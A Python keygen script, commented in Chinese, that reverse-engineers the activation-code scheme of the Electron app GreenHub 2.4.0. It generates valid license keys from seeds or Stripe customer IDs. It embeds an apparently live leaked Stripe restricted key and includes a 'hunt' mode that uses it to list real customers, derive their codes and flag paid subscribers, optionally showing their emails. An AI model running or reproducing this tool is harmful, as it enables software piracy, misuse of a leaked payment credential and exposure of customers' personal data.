#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GreenHub 2.4.0 (Electron) 激活码（License Key）派生 / 验证工具
================================================================

研究样本：D:\\Yi-Deskop\\app\\dist\\electron\\renderer.js（未混淆的 app 包）
算法来源：renderer.js 模块 228（gh.api.js）+ 激活码弹窗组件（purchaseCodeActive）

漏洞本质
--------
激活码不是服务端签名令牌，而是**客户 ID 的确定性派生值**：

    customerId = "cus_" + seed(14)        # Stripe 客户 ID 后缀前 14 位
    body       = seed(14) + serial(2)     # serial 由 seed 做位运算得出
    key(20)    = body(16) + checksum(4)   # Fletcher-16 风格校验和
    key(24)    = key(20) 每 4 字符插一个 "-"

客户端提交时只做三件事（全部离线可复刻）：
  1) isValidKey(输入)                     —— 纯本地位运算 + 校验和
  2) customerId = "cus_" + 输入前 14 位
  3) GET /v1/customers/{customerId}，比对 metadata.license_code == 输入
     再 GET /v1/subscriptions?customer={customerId} 看订阅是否 active/trialing

因此：拿到任意一个有效付费客户的 `cus_…` ID，就能本地算出它的激活码。
而 renderer.js 里又硬编码了一枚线上 Stripe 受限密钥（rk_live_…，具备读客户、
读订阅、写/取消订阅的权限），使「枚举客户 ID」这一步也不需要额外信息。

用法
----
  python greenhub_keygen.py verify  <激活码>                 # 只做本地格式校验
  python greenhub_keygen.py gen     <14位seed>                # 由 seed 生成激活码
  python greenhub_keygen.py from-id <cus_xxx>                # 由客户ID派生激活码
  python greenhub_keygen.py demo                             # 离线自检（不联网）
  python greenhub_keygen.py hunt --limit 5                   # 联网枚举（需显式开启）
  python greenhub_keygen.py hunt --limit 5 --live --json

  --live   真正发起 Stripe 请求（默认只打印将要做什么，不发包）
  --json   机器可读输出
"""

import argparse
import base64
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# --------------------------------------------------------------------------
# 1. 许可码算法（1:1 复刻 renderer.js）
# --------------------------------------------------------------------------

# 从 renderer.js 模块 228 提取的 Stripe 受限密钥（"dev" 分支为 sk_test_）
# 正式版分支值如下；可用环境变量覆盖，避免写死在脚本里
DEFAULT_STRIPE_KEY = (
    "rk_live_51L9srKCoFjkDN4xPbyeqouXwHOAjBiFRuyvxdCwE6MGTy273qzK1l6inEEaCuGU"
    "jRIPLjZcClTYywomUCx6PyD6C00snE8IMfz"
)
STRIPE_KEY = os.environ.get("GH_STRIPE_KEY", DEFAULT_STRIPE_KEY)
STRIPE_API = "https://api.stripe.com/v1"

SEED_RE = re.compile(r"^[a-zA-Z0-9]{14}$")


def _fmt_hex(value, width):
    """复刻 f(e,t)：整数 -> 定长大写十六进制（截断到 width）"""
    return format(value, "X").rjust(width, "0")[:width]


def js_parse_int_hex(text):
    """
    精确复刻 JS parseInt(text, 16)：
      - 允许前置空白与正负号
      - radix 16 时允许 "0x"/"0X" 前缀
      - 取最长合法十六进制前缀；没有则返回 NaN
      - 关键：JS 的数字是 IEEE-754 double，超过 2^53 的解析结果会被舍入，
        因此这里必须显式经过 float 再取整，否则大 seed 会算出不同 serial
    """
    s = text.lstrip()
    sign = 1
    if s[:1] in "+-":
        if s[0] == "-":
            sign = -1
        s = s[1:]
    if s[:2].lower() == "0x":
        s = s[2:]
    prefix = ""
    for ch in s.lower():
        if ch in "0123456789abcdef":
            prefix += ch
        else:
            break
    if not prefix:
        return float("nan")
    return sign * int(float(int(prefix, 16)))   # 模拟 double 舍入


def to_int32(value):
    """复刻 JS 位运算的 ToInt32（有符号 32 位）"""
    low = int(value) & 0xFFFFFFFF
    return low - 0x100000000 if low >= 0x80000000 else low


def checksum4(body16):
    """
    Fletcher-16 风格校验和（初值 175/86，模 255）-> 4 位大写十六进制。
    复刻 renderer.js 中的 g() 内联闭包。
    """
    t, n = 175, 86
    for ch in body16:
        t += ord(ch)
        if t > 255:
            t -= 255
        n += t
        if n > 255:
            n -= 255
    return _fmt_hex((n << 8) + t, 4)


def serial2(seed14):
    """
    复刻 renderer.js 中的位运算片段：
        e = parseInt(seed, 16); t = 24 % 25; n = 3 % 3; i = 200
        t 为偶数 -> (e>>t & 0xFF) ^ (((e>>n) | i) & 0xFF)

    两点必须照抄：
      1) parseInt 走 double 精度（>2^53 会舍入）；
      2) JS 的 >> 先做 ToInt32，大整数会被截断成低 32 位再看符号。
    另外 seed 含 g-z 等非十六进制字符时 parseInt 返回 NaN，NaN>>24 === 0，
    serial 退化为常量 0xC8 —— 真实样本里大量客户 ID 激活码中段都是 "C8"，
    就是这个退化分支导致的（算法缺陷之一，等价于 2 位 entropy 恒为常数）。
    """
    e = js_parse_int_hex(seed14)
    if e != e:  # NaN
        e = 0
    e32 = to_int32(e)
    t = (24 % 25) % 25
    n = (3 % 3) % 3
    i = 200
    if t % 2 == 0:
        v = ((e32 >> t) & 0xFF) ^ (((e32 >> n) | i) & 0xFF)
    else:
        v = ((e32 >> t) & 0xFF) ^ (((e32 >> n) & i) & 0xFF)
    return _fmt_hex(v & 0xFF, 2)


def derive_key(seed14):
    """seed(14) -> 完整激活码（24 字符，含 4 个 "-"）"""
    if not SEED_RE.match(seed14):
        raise ValueError("seed 必须是 14 位字母数字: %r" % (seed14,))
    body = seed14 + serial2(seed14)
    raw = body + checksum4(body)          # 20 字符
    return "-".join(raw[i:i + 4] for i in range(0, 20, 4))


def derive_from_customer_id(customer_id):
    """Stripe 客户 ID -> 激活码（客户端提交时的反过程）"""
    cid = customer_id.strip()
    if not cid.lower().startswith("cus_"):
        raise ValueError("customerId 必须以 cus_ 开头: %r" % (cid,))
    seed = cid[4:18]
    if len(seed) != 14:
        raise ValueError("customerId 去前缀后不足 14 位: %r" % (cid,))
    return {"customerId": cid, "seed": seed, "serial": serial2(seed),
            "checksum": checksum4(seed + serial2(seed)),
            "key": derive_key(seed)}


def is_valid_key(key):
    """原样复刻客户端 isValidKey()（m 函数）"""
    if len(key) != 24:
        return False, "length!=24"
    flat = key.replace("-", "")
    if len(flat) != 20:
        return False, "dash-stripped length!=20"
    body, chk = flat[:16], flat[16:20]
    if checksum4(body) != chk:
        return False, "checksum mismatch (expect %s)" % checksum4(body)
    seed = body[:14]
    if not SEED_RE.match(seed):
        return False, "seed charset invalid"
    if body[14:16] != serial2(seed):
        return False, "serial mismatch (expect %s)" % serial2(seed)
    return True, "ok"


# --------------------------------------------------------------------------
# 2. Stripe 访问（复刻客户端 gh.api.js 的调用方式）
# --------------------------------------------------------------------------

def _stripe_request(path, params=None, api_key=None):
    key = api_key or STRIPE_KEY
    url = STRIPE_API + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    auth = base64.b64encode((key + ":").encode()).decode()
    req = urllib.request.Request(url, headers={"Authorization": "Basic " + auth})
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read().decode("utf-8"))
        except Exception:
            return exc.code, {}
    except Exception as exc:  # 网络层
        return -1, {"error": str(exc)}


def _mask_email(email):
    if not email or "@" not in email:
        return "(none)"
    local, domain = email.split("@", 1)
    keep = local[:2]
    return keep + "*" * max(1, len(local) - 2) + "@" + domain


def hunt(limit=5, live=False, show_email=False, as_json=False):
    """
    枚举 Stripe 客户 -> 本地派生激活码 -> 用 metadata.license_code 反向验证
    再查订阅，筛出「订阅有效（active/trialing）」的候选。
    """
    plan = {
        "step1": "GET /v1/customers?limit=%d" % limit,
        "step2": "对每个 cus_ id 本地派生 24 位激活码",
        "step3": "比对 metadata.license_code（验证派生公式与线上数据一致）",
        "step4": "GET /v1/subscriptions?customer=<id>&status=active|trialing",
    }
    if not live:
        out = {"live": False, "plan": plan,
               "hint": "加 --live 才会真正发请求；或先用 demo/verify/gen 离线验证"}
        print(json.dumps(out, ensure_ascii=False, indent=2) if as_json
              else _render_plan(plan))
        return 0

    status, data = _stripe_request("/customers", {"limit": limit})
    if status != 200:
        print("客户列表请求失败 status=%s: %s" % (status, str(data)[:200]))
        return 1

    rows = []
    for cust in data.get("data", []):
        cid = cust.get("id", "")
        try:
            derived = derive_from_customer_id(cid)
        except ValueError:
            continue
        meta_code = (cust.get("metadata") or {}).get("license_code", "")
        match = meta_code == derived["key"]
        ok, _why = is_valid_key(derived["key"])

        s_status, s_data = _stripe_request(
            "/subscriptions", {"customer": cid, "status": "active", "limit": 3})
        tri_status, tri_data = _stripe_request(
            "/subscriptions", {"customer": cid, "status": "trialing", "limit": 3})

        subs = []
        for st, d in ((s_status, s_data), (tri_status, tri_data)):
            if st == 200:
                subs.extend(d.get("data", []))
        paid = any(s.get("status") in ("active", "trialing") for s in subs)
        prods = sorted({(s.get("plan") or {}).get("product", "") for s in subs
                        if s.get("status") in ("active", "trialing")})

        rows.append({
            "customerId": cid,
            "email": _mask_email(cust.get("email")) if not show_email else cust.get("email"),
            "derivedKey": derived["key"],
            "derivedOk": ok,
            "metadataMatchesDerivation": match,
            "hasPaidSubscription": paid,
            "products": [p for p in prods if p],
        })

    matched = sum(1 for r in rows if r["metadataMatchesDerivation"])
    payable = [r for r in rows if r["hasPaidSubscription"]]

    if as_json:
        print(json.dumps({"live": True, "count": len(rows), "rows": rows},
                         ensure_ascii=False, indent=2))
        return 0

    print("枚举客户数：%d    派生与 metadata 一致：%d/%d    有效付费订阅：%d\n"
          % (len(rows), matched, len(rows), len(payable)))
    print("%-26s %-9s %-27s %-6s %-5s" %
          ("customerId", "派生校验", "派生激活码", "线上一致", "付费订阅"))
    print("-" * 78)
    for r in rows:
        print("%-26s %-9s %-27s %-6s %-5s" %
              (r["customerId"], "OK" if r["derivedOk"] else "BAD",
               r["derivedKey"], "Y" if r["metadataMatchesDerivation"] else "N",
               "Y" if r["hasPaidSubscription"] else "N"))

    if payable:
        print("\n可用候选（客户 ID -> 激活码）：")
        for r in payable:
            print("  %s  ->  %s   (products=%s)" %
                  (r["customerId"], r["derivedKey"], ",".join(r["products"]) or "-"))
    return 0


def _render_plan(plan):
    lines = ["离线模式：未发起任何网络请求。将执行的步骤："]
    for k, v in plan.items():
        lines.append("  %-6s %s" % (k, v))
    lines.append("再执行一遍：python greenhub_keygen.py hunt --limit 5 --live")
    return "\n".join(lines)


# --------------------------------------------------------------------------
# 3. 离线自检（不含任何线上数据）
# --------------------------------------------------------------------------

def demo():
    print("== A. 算法自洽性（随机 seed -> 生成 -> 校验）==")
    import random
    import string
    alphabet = string.ascii_letters + string.digits
    ok = 0
    total = 500
    for _ in range(total):
        seed = "".join(random.choice(alphabet) for _ in range(14))
        key = derive_key(seed)
        if is_valid_key(key)[0]:
            ok += 1
    print("  自洽率：%d/%d\n" % (ok, total))

    print("== B. 已知样本对照 ==")
    sample = "FU5K-Y0Uj-Lma0-Wt4k-38A1"   # 来自 main.js 的打包内置 patch 配置
    print("  %s -> valid=%s (%s)\n" % (sample, *is_valid_key(sample)))

    print("== C. 客户 ID 派生示例（虚构 seed）==")
    for seed in ("AAAABBBBCCCCDD", "ZzZzZz12345678", "c0ffee1234abcd"):
        d = derive_from_customer_id("cus_" + seed)
        print("  cus_%-16s -> %s  valid=%s" % (seed, d["key"], is_valid_key(d["key"])[0]))
    print("\n== D. 结构说明 ==")
    print("  24 字符 = seed(14) + serial(2) + checksum(4)，每 4 字符插入 '-'")
    print("  seed 即 Stripe customerId 的后 14 位 -> customerId 可由激活码前 14 位还原")
    return 0


# --------------------------------------------------------------------------
# 4. CLI
# --------------------------------------------------------------------------

def main(argv=None):
    ap = argparse.ArgumentParser(
        description="GreenHub 2.4.0 激活码派生/验证（本地样本逆向研究）")
    sub = ap.add_subparsers(dest="cmd")

    p_verify = sub.add_parser("verify", help="只做本地格式校验")
    p_verify.add_argument("code")

    p_gen = sub.add_parser("gen", help="由 14 位 seed 生成激活码")
    p_gen.add_argument("seed")

    p_id = sub.add_parser("from-id", help="由 Stripe customerId 派生激活码")
    p_id.add_argument("customer_id")

    sub.add_parser("demo", help="离线自检")

    p_hunt = sub.add_parser("hunt", help="枚举客户并派生激活码")
    p_hunt.add_argument("--limit", type=int, default=5)
    p_hunt.add_argument("--live", action="store_true")
    p_hunt.add_argument("--show-email", action="store_true")
    p_hunt.add_argument("--json", action="store_true")

    args = ap.parse_args(argv)

    if args.cmd == "verify":
        ok, why = is_valid_key(args.code)
        print("code   :", args.code)
        print("valid  :", ok)
        print("detail :", why)
        return 0 if ok else 3

    if args.cmd == "gen":
        print(derive_key(args.seed))
        return 0

    if args.cmd == "from-id":
        d = derive_from_customer_id(args.customer_id)
        print(json.dumps(d, ensure_ascii=False, indent=2))
        print("valid  :", is_valid_key(d["key"])[0])
        return 0

    if args.cmd == "demo":
        return demo()

    if args.cmd == "hunt":
        return hunt(args.limit, args.live, args.show_email, args.json)

    ap.print_help()
    return 2


if __name__ == "__main__":
    sys.exit(main())
